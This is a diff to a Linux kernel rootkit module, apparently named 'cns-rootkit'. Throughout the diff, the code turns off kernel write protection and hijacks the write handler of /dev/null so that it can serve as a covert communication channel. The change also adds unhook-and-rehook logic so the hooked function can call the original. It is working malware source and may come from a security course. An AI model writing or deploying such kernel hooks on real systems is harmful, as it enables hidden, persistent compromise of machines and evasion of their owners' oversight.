@@ -2,6 +2,7 @@
 #include <linux/kernel.h>
 #include <linux/init.h>
 #include <linux/fs.h>
+#include <linux/slab.h>
 
 #define DISABLE_W_PROTECTED_MEMORY \
     do { \
@@ -51,7 +52,7 @@ void hook_patch(void *modified_function) {
   }
 }
 
-void hook_unpatch(void *modified_function) {
+void *hook_unpatch(void *modified_function) {
   struct hook *h;
 
   list_for_each_entry(h, &hook_list, list) {
@@ -59,9 +60,11 @@ void hook_unpatch(void *modified_function) {
       DISABLE_W_PROTECTED_MEMORY
       *(h->modified_at) = h->original_function;
       ENABLE_W_PROTECTED_MEMORY
-      break;
+      return h->original_function;
     }
   }
+
+  return NULL;
 }
 
 /*int hook_remove_all() {
@@ -73,14 +76,12 @@ int unestablish_comm_channel(void);
 
 ssize_t cns_rootkit_dev_null_write(struct file *, char __user *, size_t, loff_t *);
 
-
-ssize_t (*original_dev_null_write) (struct file *, char __user *, size_t, loff_t *);
-
 ssize_t cns_rootkit_dev_null_write(struct file *filep, char __user *buf, size_t count, loff_t *p) {
   printk(KERN_INFO "cns-rootkit: In my /dev/null write\n");
-  unestablish_comm_channel();
+  ssize_t (*original_dev_null_write) (struct file *filep, char __user *buf, size_t count, loff_t *p);
+  original_dev_null_write = hook_unpatch((void *) cns_rootkit_dev_null_write);
   ssize_t res =  original_dev_null_write(filep, buf, count, p);
-  establish_comm_channel();
+  hook_patch((void *) cns_rootkit_dev_null_write);
 
   return res;
 }
@@ -104,7 +105,7 @@ int establish_comm_channel(void) {
   */
 
   hook_add((void **)(&(dev_null_fop->write)), (void *)cns_rootkit_dev_null_write);
-
+  hook_patch((void *)cns_rootkit_dev_null_write);
   printk(KERN_INFO "cns-rootkit: Successfully established communication channel\n");
   return 0;
 }
@@ -119,9 +120,6 @@ int unestablish_comm_channel(void) {
   struct file_operations *dev_null_fop;
   dev_null_fop = (struct file_operations *) dev_null_file->f_op;
   filp_close(dev_null_file, 0);
-  DISABLE_W_PROTECTED_MEMORY
-  dev_null_fop->write = original_dev_null_write;
-  ENABLE_W_PROTECTED_MEMORY
   printk(KERN_INFO "cns-rootkit: Successfully unestablished communication channel\n");
   return 0;
 }
